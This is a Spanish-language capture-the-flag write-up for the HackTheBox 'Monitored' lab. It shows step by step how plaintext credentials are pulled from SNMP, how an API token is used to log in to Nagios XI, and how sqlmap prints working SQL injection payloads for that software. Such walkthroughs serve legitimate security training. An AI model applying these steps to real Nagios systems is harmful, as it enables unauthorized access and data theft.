<!doctype html><html lang=es><head><title>HTB Monitored WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackTheBox 'Monitored' WriteUp"><meta name=keywords content="blog,pentesting,hacking"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB Monitored WriteUp"><meta name=twitter:description content="HackTheBox 'Monitored' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/es/posts/monitored/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="HTB Monitored WriteUp"><meta property="og:description" content="HackTheBox 'Monitored' WriteUp"><meta property="og:locale" content="es"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-05-11T00:00:00+00:00"><meta property="article:modified_time" content="2024-05-11T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Medium"><meta property="article:tag" content="Api"><meta property="article:tag" content="Linpeas"><link rel=canonical href=https://gunzf0x.github.io/pentesting/es/posts/monitored/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.b587cb1f00f2309d3943f06d512873c8c174188c45cb8406de0bfe6523023297.css integrity="sha256-tYfLHwDyMJ05Q/BtUShzyMF0GIxFy4QG3gv+ZSMCMpc=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting/es>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/es/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/projects/>Proyectos</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/contact/>Contacto</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/posts/monitored/>üá¨üáß</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/es/posts/monitored/>HTB Monitored WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-05-11T00:00:00Z>11 mayo, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
18 minutos de lectura.</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/es/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/linux/>Linux</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/medium/>Medium</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/api/>Api</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/linpeas/>Linpeas</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/nagios/>Nagios</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/cookies/>Cookies</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/netcat/>Netcat</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/sudo/>Sudo</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/udp/>Udp</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/snmp/>Snmp</a></span></div></div></header><div class=post-content><hr><h1 id=monitored----hackthebox>Monitored &ndash; HackTheBox
<a class=heading-link href=#monitored----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Linux</em></li><li>Difficulty/Dificultad: <em>Medium</em></li><li>Plataforma: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;Monitored&rsquo; Avatar" src=/pentesting/images/Monitored_avatar.png></p><hr><h2 id=user--usuario>User / Usuario
<a class=heading-link href=#user--usuario><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Empezamos con un scan con <code>Nmap</code> contra la m√°quina v√≠ctima, donde vemos los siguientes puertos abiertos: <code>22</code> <code>SSH</code>, <code>80</code> <code>HTTP</code>, <code>389</code> <code>Lightweight Directory Access Protocol</code> (<code>LDAP</code>), <code>443</code> <code>HTTPs</code> y <code>5667</code> (un servicio, de momento, desconocido)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p22,80,389,443,5667 10.10.11.248 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-10 19:00 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.248
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.21s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT     STATE SERVICE    VERSION
</span></span></span><span class=line><span class=cl><span class=go>22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
</span></span></span><span class=line><span class=cl><span class=go>| ssh-hostkey:
</span></span></span><span class=line><span class=cl><span class=go>|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
</span></span></span><span class=line><span class=cl><span class=go>|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
</span></span></span><span class=line><span class=cl><span class=go>|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
</span></span></span><span class=line><span class=cl><span class=go>80/tcp   open  http       Apache httpd 2.4.56
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Did not follow redirect to https://nagios.monitored.htb/
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Apache/2.4.56 (Debian)
</span></span></span><span class=line><span class=cl><span class=go>389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
</span></span></span><span class=line><span class=cl><span class=go>443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Apache/2.4.56 (Debian)
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-11-11T21:46:55
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2297-08-25T21:46:55
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Nagios XI
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: TLS randomness does not represent time
</span></span></span><span class=line><span class=cl><span class=go>| tls-alpn:
</span></span></span><span class=line><span class=cl><span class=go>|_  http/1.1
</span></span></span><span class=line><span class=cl><span class=go>5667/tcp open  tcpwrapped
</span></span></span><span class=line><span class=cl><span class=go>Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 27.86 seconds
</span></span></span></code></pre></div><p>Mirando el scan al puerto <code>80</code> <code>HTTP</code> el servicio redirige a <code>nagios.monitored.htb</code>. De manera que agregamos este dominio a nuestro archivo <code>/etc/hosts</code> de nuestra m√°quina Linux:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo echo &#39;10.10.11.248 monitored.htb nagios.monitored.htb&#39; &gt;&gt; /etc/hosts
</span></span></span></code></pre></div><p>donde <code>10.10.11.248</code> es la IP de la m√°quina v√≠ctima.</p><p>Esta m√°quina tambi√©n presenta puertos <code>UDP</code> abiertos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sUV -p123,161 10.10.11.248 -oN targeted_UDP
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-10 19:47 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for monitored.htb (10.10.11.248)
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.16s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT    STATE SERVICE VERSION
</span></span></span><span class=line><span class=cl><span class=go>123/udp open  ntp     NTP v4 (unsynchronized)
</span></span></span><span class=line><span class=cl><span class=go>161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
</span></span></span><span class=line><span class=cl><span class=go>Service Info: Host: monitored
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 1.24 seconds
</span></span></span></code></pre></div><p>con el puerto <code>161</code> corriendo el servicio <code>Simple Network Management Protocol</code> (<code>SNMP</code>).</p><p>Visitando <code>https://nagios.monitored.htb</code> podemos ver una p√°gina web:</p><p><img alt="Monitored 1" src=/pentesting/images/Monitored_1.png></p><p>El server est√°, aparentemente, corriendo <code>Nagios XI</code>, un software utilizado para el monitoreo de actividades.<div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Informaci√≥n</div><div class=notice-content><code>Nagios XI</code> es una interfaz extendida de <code>Nagios Core</code>. <code>Nagios</code> es un sistema de monitorizaci√≥n de redes ampliamente utilizado, de c√≥digo abierto, que vigila los equipos y servicios que se especifiquen, alertando cuando el comportamiento de los mismos no sea el deseado.</div></div></p><p>Clickeando en <code>Access Nagios XI</code> en esta p√°gina web nos lleva a un panel de login:</p><p><img alt="Monitored 2" src=/pentesting/images/Monitored_2.png></p><p>Buscando en internet por credenciales por defecto para <code>Nagios XI</code> encontramos que son <code>root:nagiosxi</code>. Pero no funcionan en este panel de login. Otras t√≠picas credenciales como <code>admin:admin</code> o <code>guest:guest</code> tampoco funcionan.</p><p>En este punto, dado que no tenemos ninguna credencial v√°lida, intentamos realizar un <code>Brute Force Directory Listing</code> usando <code>Gobuster</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://nagios.monitored.htb/nagiosxi/ -x php -t 55 -k
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Gobuster v3.6
</span></span></span><span class=line><span class=cl><span class=go>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>[+] Url:                     https://nagios.monitored.htb/nagiosxi/
</span></span></span><span class=line><span class=cl><span class=go>[+] Method:                  GET
</span></span></span><span class=line><span class=cl><span class=go>[+] Threads:                 55
</span></span></span><span class=line><span class=cl><span class=go>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></span><span class=line><span class=cl><span class=go>[+] Negative Status codes:   404
</span></span></span><span class=line><span class=cl><span class=go>[+] User Agent:              gobuster/3.6
</span></span></span><span class=line><span class=cl><span class=go>[+] Extensions:              php
</span></span></span><span class=line><span class=cl><span class=go>[+] Timeout:                 10s
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Starting gobuster in directory enumeration mode
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>/index.php            (Status: 302) [Size: 27] [--&gt; https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&amp;noauth=1]
</span></span></span><span class=line><span class=cl><span class=go>/images               (Status: 301) [Size: 340] [--&gt; https://nagios.monitored.htb/nagiosxi/images/]
</span></span></span><span class=line><span class=cl><span class=go>/about                (Status: 301) [Size: 339] [--&gt; https://nagios.monitored.htb/nagiosxi/about/]
</span></span></span><span class=line><span class=cl><span class=go>/.php                 (Status: 403) [Size: 286]
</span></span></span><span class=line><span class=cl><span class=go>/login.php            (Status: 200) [Size: 26575]
</span></span></span><span class=line><span class=cl><span class=go>/help                 (Status: 301) [Size: 338] [--&gt; https://nagios.monitored.htb/nagiosxi/help/]
</span></span></span><span class=line><span class=cl><span class=go>/tools                (Status: 301) [Size: 339] [--&gt; https://nagios.monitored.htb/nagiosxi/tools/]
</span></span></span><span class=line><span class=cl><span class=go>/mobile               (Status: 301) [Size: 340] [--&gt; https://nagios.monitored.htb/nagiosxi/mobile/]
</span></span></span><span class=line><span class=cl><span class=go>/admin                (Status: 301) [Size: 339] [--&gt; https://nagios.monitored.htb/nagiosxi/admin/]
</span></span></span><span class=line><span class=cl><span class=go>/reports              (Status: 301) [Size: 341] [--&gt; https://nagios.monitored.htb/nagiosxi/reports/]
</span></span></span><span class=line><span class=cl><span class=go>/account              (Status: 301) [Size: 341] [--&gt; https://nagios.monitored.htb/nagiosxi/account/]
</span></span></span><span class=line><span class=cl><span class=go>/includes             (Status: 301) [Size: 342] [--&gt; https://nagios.monitored.htb/nagiosxi/includes/]
</span></span></span><span class=line><span class=cl><span class=go>/install.php          (Status: 302) [Size: 0] [--&gt; https://nagios.monitored.htb/nagiosxi/]
</span></span></span><span class=line><span class=cl><span class=go>/backend              (Status: 301) [Size: 341] [--&gt; https://nagios.monitored.htb/nagiosxi/backend/]
</span></span></span><span class=line><span class=cl><span class=go>/db                   (Status: 301) [Size: 336] [--&gt; https://nagios.monitored.htb/nagiosxi/db/]
</span></span></span><span class=line><span class=cl><span class=go>/api                  (Status: 301) [Size: 337] [--&gt; https://nagios.monitored.htb/nagiosxi/api/]
</span></span></span><span class=line><span class=cl><span class=go>/upgrade.php          (Status: 302) [Size: 0] [--&gt; index.php]
</span></span></span><span class=line><span class=cl><span class=go>/config               (Status: 301) [Size: 340] [--&gt; https://nagios.monitored.htb/nagiosxi/config/]
</span></span></span><span class=line><span class=cl><span class=go>/suggest.php          (Status: 200) [Size: 27]
</span></span></span><span class=line><span class=cl><span class=go>/views                (Status: 301) [Size: 339] [--&gt; https://nagios.monitored.htb/nagiosxi/views/]
</span></span></span><span class=line><span class=cl><span class=go>/sounds               (Status: 403) [Size: 286]
</span></span></span><span class=line><span class=cl><span class=go>/rr.php               (Status: 302) [Size: 0] [--&gt; login.php]
</span></span></span><span class=line><span class=cl><span class=go>/terminal             (Status: 200) [Size: 5215]
</span></span></span><span class=line><span class=cl><span class=go>/.php                 (Status: 403) [Size: 286]
</span></span></span><span class=line><span class=cl><span class=go>Progress: 441120 / 441122 (100.00%)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Finished
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span></code></pre></div><p>Visitando <code>https://nagios.monitored.htb/nagiosxi/terminal/</code> muestra una especie de terminal que pide un usuario y contrase√±a:</p><p><img alt="Monitored 3" src=/pentesting/images/Monitored_3.png></p><p>de manera que no es interesante de momento, ya que no tenemos credenciales.</p><p>De vuelta a los puertos corriendo por protocolo <code>UDP</code>, chequeando los mensajes por <code>SNMP</code> con <code>snmpwalk</code> podemos ver lo siguiente:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ snmpwalk -v 2c -c public 10.10.11.248
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>iso.3.6.1.2.1.1.1.0 = STRING: &#34;Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64&#34;
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.3.0 = Timeticks: (434466) 1:12:24.66
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.4.0 = STRING: &#34;Me &lt;root@monitored.htb&gt;&#34;
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.5.0 = STRING: &#34;monitored&#34;
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.6.0 = STRING: &#34;Sitting on the Dock of the Bay&#34;
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.7.0 = INTEGER: 72
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.8.0 = Timeticks: (1581) 0:00:15.81
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>pero esto demora demasiado. Podemos realizar esto m√°s r√°pido corriendo <code>snmpbulkwalk</code>, guardando todo el output en un archivo llamado <code>snmpbulk-output.txt</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ snmpbulkwalk -Cr1000 -c public -v2c 10.10.11.248 &gt; snmpbulk-output.txt
</span></span></span></code></pre></div><p>Si reviso el archivo creado con <code>cat</code> puedo, eventualmente, ver algo interesante:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat snmpbulk-output.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>iso.3.6.1.2.1.1.1.0 = STRING: &#34;Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64&#34;
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.3.0 = Timeticks: (451621) 1:15:16.21
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.4.0 = STRING: &#34;Me &lt;root@monitored.htb&gt;&#34;
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.5.0 = STRING: &#34;monitored&#34;
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.6.0 = STRING: &#34;Sitting on the Dock of the Bay&#34;
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.7.0 = INTEGER: 72
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.8.0 = Timeticks: (1581) 0:00:15.81
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.25.4.2.1.5.1379 = STRING: &#34;-d /usr/local/nagios/etc/nagios.cfg&#34;
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.25.4.2.1.5.1420 = STRING: &#34;-u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB&#34;
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.25.4.2.1.5.1421 = STRING: &#34;-c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB&#34;
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.25.4.2.1.5.1433 = STRING: &#34;-bd -q30m&#34;
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>donde tenemos un usuario y una contrase√±a: <code>svc:XjH7VCehowpR1xZB</code></p><p>Usando estas credenciales en <code>https://nagios.monitored.htb/nagiosxi/login.php</code> (el panel de login) no funciona:</p><p><img alt="Monitored 4" src=/pentesting/images/Monitored_4.png></p><p>No obstante, noto que el mensaje mostrado de la p√°gina es distinto a cuando prove√≠a usuario y contrase√±as incorrectas:</p><p><img alt="Monitored 5" src=/pentesting/images/Monitored_5.png></p><p>de manera que asumo que el usuario <code>svc</code> existe.</p><p>De vuelta a los directorios encontrados con <code>Gobuster</code>, el directorio <code>/api</code>, y luego de aplicar algo m√°s de fuerza bruta con los directorios, lleva a la direcci√≥n <code>https://nagios.monitored.htb/nagiosxi/api/v1/authenticate/</code>:</p><p><img alt="Monitored 6" src=/pentesting/images/Monitored_6.png></p><p>donde usando <code>cURL</code> con el m√©todo <code>POST</code> tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s -X POST &#39;https://nagios.monitored.htb/nagiosxi/api/v1/authenticate&#39; --insecure
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>{&#34;error&#34;:&#34;Must be valid username and password.&#34;}
</span></span></span></code></pre></div><p>De manera que, aparentemente, el servicio est√° preguntando por los campos <code>username</code> (usuario) y <code>password</code> (contrase√±a). Podemos tratar de usar la data que hab√≠amos encontrado previamente por <code>SNMP</code> usando <code>cURL</code> tambi√©n:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s -X POST &#39;https://nagios.monitored.htb/nagiosxi/api/v1/authenticate&#39; --insecure -d &#39;username=svc&amp;password=XjH7VCehowpR1xZB&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>{&#34;username&#34;:&#34;svc&#34;,&#34;user_id&#34;:&#34;2&#34;,&#34;auth_token&#34;:&#34;eebd2c4f308f2ec54f93a4392e75a5a5d952bf50&#34;,&#34;valid_min&#34;:5,&#34;valid_until&#34;:&#34;Fri, 10 May 2024 20:42:26 -0400&#34;}
</span></span></span></code></pre></div><p>donde podemos ver un <code>auth_token</code> el cual podemos extraer.</p><p>Chequeando la <a href=https://www.nagios.org/ncpa/help/2.0/api.html class=external-link target=_blank rel=noopener>documentaci√≥n de Nagios XI</a> podemos ver que para interactuar con los tokens podemos visitar:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>https://localhost:5693/api?token=mytoken
</span></span></code></pre></div><p>Luego de jugar con los par√°metros, proveer el token extra√≠do de la API, y probar algunas cosas, la siguiente p√°gina funciona:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s --insecure &#39;https://nagios.monitored.htb/nagiosxi/login.php?token=eebd2c4f308f2ec54f93a4392e75a5a5d952bf50&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>        &lt;!DOCTYPE html&gt;
</span></span></span><span class=line><span class=cl><span class=go>        &lt;!-- &lt;!DOCTYPE html&gt; --&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>y visitando la p√°gina web del servidor v√≠ctima <code>https://nagios.monitored.htb/nagiosxi/login.php?token=eebd2c4f308f2ec54f93a4392e75a5a5d952bf50</code> desde el browser de <code>Firefox</code> muestra un nuevo panel:</p><p><img alt="Monitored 7" src=/pentesting/images/Monitored_7.png></p><p>Ahora que estamos logueados es que busco por vulnerabilidades para <code>Nagios XI</code>, m√°s espec√≠ficamente para la versi√≥n <code>5.11.0</code> (como se puede ver a la esquina inferior izquierda de la √∫ltima imagen). Encontramos <a href=https://outpost24.com/blog/nagios-xi-vulnerabilities/ class=external-link target=_blank rel=noopener>este post</a> el cual indica un par de potenciales <code>SQL Injection</code> basadas en la ruta:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>/nagiosxi/admin/banner_message-ajaxhelper.php
</span></span></code></pre></div><p>basada en el par√°metro <code>id</code> (punto 3 del post) con la acci√≥n <code>update_banner_message_settings</code>.</p><p>Usamos <code>SQLMap</code> contra esta ruta. Primero, obtengo la cookie <code>nagiosxi</code> yendo a mi navegador de <code>Firefox</code>, luego a <code>Inspect > Storage</code> y obtengo la cookie. En mi caso, la cookie es <code>dkkthk9urkl17li0bsrn5r2t96</code>. Luego le paso toda la data necesaria al prompt de <code>SQLMap</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sqlmap -u &#39;https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&#39; -p &#39;id&#39; --cookie=&#39;nagiosxi=dkkthk9urkl17li0bsrn5r2t96&#39; --batch
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>GET parameter &#39;id&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
</span></span></span><span class=line><span class=cl><span class=go>sqlmap identified the following injection point(s) with a total of 261 HTTP(s) requests:
</span></span></span><span class=line><span class=cl><span class=go>---
</span></span></span><span class=line><span class=cl><span class=go>Parameter: id (GET)
</span></span></span><span class=line><span class=cl><span class=go>    Type: boolean-based blind
</span></span></span><span class=line><span class=cl><span class=go>    Title: Boolean-based blind - Parameter replace (original value)
</span></span></span><span class=line><span class=cl><span class=go>    Payload: action=acknowledge_banner_message&amp;id=(SELECT (CASE WHEN (4806=4806) THEN 3 ELSE (SELECT 7441 UNION SELECT 9346) END))
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    Type: error-based
</span></span></span><span class=line><span class=cl><span class=go>    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
</span></span></span><span class=line><span class=cl><span class=go>    Payload: action=acknowledge_banner_message&amp;id=3 OR (SELECT 2606 FROM(SELECT COUNT(*),CONCAT(0x7176766b71,(SELECT (ELT(2606=2606,1))),0x716b706271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    Type: time-based blind
</span></span></span><span class=line><span class=cl><span class=go>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
</span></span></span><span class=line><span class=cl><span class=go>    Payload: action=acknowledge_banner_message&amp;id=3 AND (SELECT 7051 FROM (SELECT(SLEEP(5)))xZsL)
</span></span></span><span class=line><span class=cl><span class=go>---
</span></span></span><span class=line><span class=cl><span class=go>[21:54:21] [INFO] the back-end DBMS is MySQL
</span></span></span><span class=line><span class=cl><span class=go>web server operating system: Linux Debian
</span></span></span><span class=line><span class=cl><span class=go>web application technology: Apache 2.4.56
</span></span></span><span class=line><span class=cl><span class=go>back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
